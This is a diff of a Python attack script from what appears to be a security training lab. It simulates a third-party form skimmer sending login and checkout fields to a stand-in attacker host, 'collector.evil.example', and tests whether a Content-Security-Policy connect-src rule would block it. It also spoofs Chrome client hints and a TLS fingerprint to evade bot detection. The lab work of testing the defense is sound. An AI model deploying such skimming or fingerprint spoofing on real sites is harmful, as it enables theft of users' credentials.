@@ -1,126 +1,110 @@
 """
-Capstone Round 3 Attack — a third-party form skimmer (W3 Ch5)
+Round 3 attack: a third-party form skimmer (W3 Ch5). Level 7 stops it; below it the exfil lands.
 
-A skimmer rides in a trusted third-party script (static/analytics-helper.js),
-reads the checkout/login fields, and POSTs them to an attacker origin in
-parallel with the honest submit (see static/skimmer.js). The user sees nothing
-and the TLS to the real server is intact, so nothing on the server side notices
-the extra connection — only the *browser* can refuse it.
+A skimmer rides in a trusted third-party script (static/js/analytics-helper.js, a vendor tag on every page), reads
+the checkout or login fields and POSTs them to an attacker origin in parallel with the honest submit
+(static/js/skimmer.js is the payload). The user sees nothing, and the TLS to the real server is intact, so nothing on
+the server side notices the extra connection. Only the *browser* can refuse it, so this attack measures the defense
+the way a browser would decide it:
 
-Because the enforcement is in the browser, this attack measures the defense the
-way the browser would decide it: it reads the Content-Security-Policy the page
-ships and asks "would this policy let the skimmer POST to the collector?" At
-L<7 there is no enforcing policy, so the exfil succeeds; at L7, once you set
-connect-src to 'self' (the Round 3 TODO in defenses/supply_chain.py), the
-browser would refuse it and fire a violation report. The attack also posts that
-report to /api/script-violation, the way a real browser would, so you can see
-the session's L7 score rise.
+  1. it loads /login, finds the vendor tag and reads the Content-Security-Policy the page ships
+  2. it asks "would that policy let the skimmer POST to the collector?" (a Report-Only policy blocks nothing)
+  3. below level 7 there is no policy: the exfil succeeds. At level 7, once connect-src is locked to 'self' (the
+     Round 3 TODO in defenses/supply_chain.py), the browser would refuse it, and it would send the violation report
+     that the attack posts to /api/script-violation, so the session's level 7 score rises
+  4. a real-browser proof (headless Chromium) injects the skimmer into the page and watches the console: a CSP
+     refusal is a "Content Security Policy" error. Skipped, and said so, when Playwright's browser is not installed.
 
-An optional browser proof (Playwright) is attempted and skipped if no browser
-is installed. The skimmer and collector are entirely local and fictional.
+The collector is fictional and is never contacted: the browser context aborts every request that leaves this machine.
 
-Run (store running at DEFENSE_LEVEL 7):
     python attacks/round3_skimmer.py
 """
 
-import os
 import sys
 
-from curl_cffi import requests as cffi
+from _api import BASE_URL, Bot, Cost, emit, lab_headers, rng_for, say, verdict
 
-sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
-from _common import Cost, egress_pool, report, rng_for, summary, target  # noqa: E402
-
-COLLECTOR = "https://collector.evil.example/collect"
+COLLECTOR_ORIGIN = "https://collector.evil.example"
+COLLECTOR = COLLECTOR_ORIGIN + "/collect"
 
 
-def _connect_src(csp_value):
-    for directive in csp_value.split(";"):
-        parts = directive.split()
-        if parts and parts[0].lower() == "connect-src":
-            return parts[1:]
-    return None
-
-
-def _would_exfil(csp_value):
-    """Mirror the browser's connect-src check: would a POST to COLLECTOR be allowed?"""
-    if not csp_value:
-        return True  # no policy: the browser allows the cross-origin POST
-    sources = _connect_src(csp_value)
+def would_exfil(headers):
+    """Mirror the browser's connect-src check: would a POST to COLLECTOR be allowed by the page's enforced policy?"""
+    csp = headers.get("Content-Security-Policy")                     # Report-Only never blocks, so only this one counts
+    if not csp:
+        return True
+    sources = next((d.split()[1:] for d in csp.split(";") if d.split() and d.split()[0].lower() == "connect-src"), None)
     if sources is None:
-        return True  # connect-src not set: falls back to default-src, but treat as open here
+        sources = next((d.split()[1:] for d in csp.split(";") if d.split() and d.split()[0].lower() == "default-src"), [])
     host = COLLECTOR.split("://", 1)[-1].split("/", 1)[0]
-    for src in sources:
-        if src in ("*", "https:"):
-            return True
-        if src.startswith("http") and src.split("://", 1)[-1].split("/", 1)[0] == host:
-            return True
-    return False
+    return any(src in ("*", "https:") or (src.startswith("http") and src.split("://", 1)[-1].split("/", 1)[0] == host)
+               for src in sources)
 
 
-def skim(base, egress):
-    s = cffi.Session(impersonate="chrome150", verify=False, timeout=15)
-    s.headers.update({"X-Lab-Egress": egress})
-    r = s.get(f"{base}/login")  # a page with the third-party analytics tag + form fields
-    loaded = "/static/analytics-helper.js" in r.text
-    # The policy the browser would enforce. Report-only does not block.
-    enforced = r.headers.get("Content-Security-Policy")
-    report_only = r.headers.get("Content-Security-Policy-Report-Only")
-    exfil = _would_exfil(enforced)  # report-only never blocks, so only the enforced policy matters
-    # Post the violation report the browser would send when blocked, so L7 scores the session.
-    sid = None
-    if not exfil:
-        s.post(f"{base}/api/script-violation",
-               json={"csp-report": {"blocked-uri": COLLECTOR, "violated-directive": "connect-src"}})
-        sid = s.get(f"{base}/whoami").json().get("sid")
-    reasons = ([f"exfil to {COLLECTOR} would be allowed (policy: "
-                f"{'report-only' if report_only else 'none'})"] if exfil
-               else [f"browser would block exfil to {COLLECTOR} (connect-src enforced)"])
-    return {"vector": "form_skimmer", "host_loaded": loaded, "exfiltrated": exfil,
-            "outcome": "allow" if exfil else "block", "reasons": reasons, "sid": sid}
+CHROME_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36"
+# Headless Chromium names itself in the Client Hints; level 1 refuses that (it is Round 0's lesson). The browser here
+# plays a CUSTOMER of the store, whose page the skimmer lives on, so it is given a customer's Chrome identity.
+CHROME_HINTS = {"Sec-CH-UA": '"Google Chrome";v="153", "Chromium";v="153", "Not_A Brand";v="8"',
+                "Sec-CH-UA-Mobile": "?0", "Sec-CH-UA-Platform": '"Linux"',
+                "X-Lab-JA4": "t13d1516h2_8daaf6152771_806a8c22fdea"}
 
 
-def browser_proof(base):
-    """Optional: drive a real browser to confirm the CSP actually blocks the exfil.
-    Skipped cleanly if Playwright/Chromium is not installed."""
+def browser_proof():
+    """
+    Drive Chromium as the victim: load /login, let the compromised vendor tag's payload (skimmer.js) run, type into the
+    form, and watch two things: did CSP refuse the exfil (a "Content Security Policy" console error), and did the
+    page's own same-origin telemetry still get through (the policy must not break the store). None when it cannot run.
+    """
     try:
         from playwright.sync_api import sync_playwright
-    except Exception:
-        return None
-    try:
+        import labclient
+        ip = labclient.world_pool("home_broadband")[7]
         with sync_playwright() as p:
             browser = p.chromium.launch(headless=True)
-            ctx = browser.new_context(ignore_https_errors=True)
+            ctx = labclient.browser_context(browser, "bot:round3_skimmer_proof", ip=ip, user_agent=CHROME_UA)
+            ctx.set_extra_http_headers(dict(CHROME_HINTS, **{"X-Lab-Client-IP": ip, "X-Lab-Actor": "bot:round3_skimmer_proof"}))
             page = ctx.new_page()
-            blocked = {"n": 0}
-            page.on("console", lambda m: blocked.update(n=blocked["n"] + 1) if "Content Security Policy" in m.text else None)
-            page.goto(f"{base}/login")
-            page.evaluate(f"fetch('{COLLECTOR}', {{method:'POST', body:'x', mode:'no-cors'}}).catch(()=>0)")
-            page.wait_for_timeout(500)
+            refused = []
+            page.on("console", lambda m: refused.append(m.text) if "Content Security Policy" in m.text and "collector" in m.text else None)
+            page.goto(BASE_URL + "/login", timeout=15000)
+            page.add_script_tag(url=BASE_URL + "/static/js/skimmer.js")   # what the compromised vendor tag would do
+            page.fill("#login-form input[name=email]", "victim@example.test")
+            page.dispatch_event("#login-form input[name=email]", "change")   # fill() sends only `input`; the skimmer listens for `change`
+            page.wait_for_timeout(1200)
             browser.close()
-            return blocked["n"] > 0
-    except Exception:
+        rows = labclient.admin("GET", "/lab/decisions", params={"actor": "bot:round3_skimmer_proof", "path": "/api/telemetry"})
+        return {"csp_refused": bool(refused), "telemetry_ok": any(r["outcome"] == "served" for r in rows["items"])}
+    except Exception as exc:                                          # no browser installed, or it would not start
+        print(f"  browser proof skipped: {type(exc).__name__}: {str(exc)[:80]}", file=sys.stderr)
         return None
 
 
-def run(verbose=False):
-    base = target()
-    rng = rng_for("round3")
-    pool = egress_pool()
+def skim(rng):
+    bot = Bot("bot:round3_skimmer", rng)
+    r = bot.get("/login")                                              # a page with the vendor tag and the form fields
+    loaded = "/static/js/analytics-helper.js" in r.text
+    enforced = r.headers.get("Content-Security-Policy")
+    report_only = r.headers.get("Content-Security-Policy-Report-Only")
+    exfil = would_exfil(r.headers)
+    if not exfil:                                                      # what the browser would send when it refuses
+        bot.post("/api/script-violation", json={"csp-report": {"blocked-uri": COLLECTOR, "violated-directive": "connect-src"}})
+    res = verdict(r)
+    res.update(status="reserved" if exfil else "blocked", vendor_tag=loaded,
+               policy="enforced" if enforced else "report-only" if report_only else "none",
+               signals=[f"exfil to {COLLECTOR_ORIGIN} " + ("would be allowed" if exfil else "refused by connect-src")])
+    return res
+
+
+if __name__ == "__main__":
+    print("=== Round 3: form skimmer ===")
     with Cost() as cost:
-        results = [skim(base, rng.choice(pool))]
-    s = summary("round3_skimmer", results, cost, success_key="exfiltrated")
-    proof = browser_proof(base)
-    if proof is not None:
-        s["browser_proof"] = "blocked by CSP in a real browser" if proof else "NOT blocked in browser"
-    if verbose:
-        report(s, success_label="exfiltration succeeded")
-        for r in results:
-            print(f"  {r['vector']:<14} host_loaded={r['host_loaded']} {r['outcome']:<6} {r['reasons'][:1]}")
-        if proof is not None:
-            print(f"  browser proof: {s['browser_proof']}")
-    return s
-
-
-if __name__ == '__main__':
-    run(verbose=True)
+        res = skim(rng_for("round3"))
+        proof = browser_proof()
+    say("form_skimmer", res, f"vendor tag loaded: {res['vendor_tag']}, policy: {res['policy']}")
+    if proof is None:
+        note = "skipped"
+    else:
+        note = ("CSP refused the exfil in Chromium" if proof["csp_refused"] else "NOT refused by CSP in Chromium") + \
+               (", same-origin telemetry still worked" if proof["telemetry_ok"] else ", but the page's own telemetry did NOT get through")
+    print(f"  browser proof: {note}")
+    emit("round3_skimmer", [res], cost, policy=res["policy"], browser_proof=note)
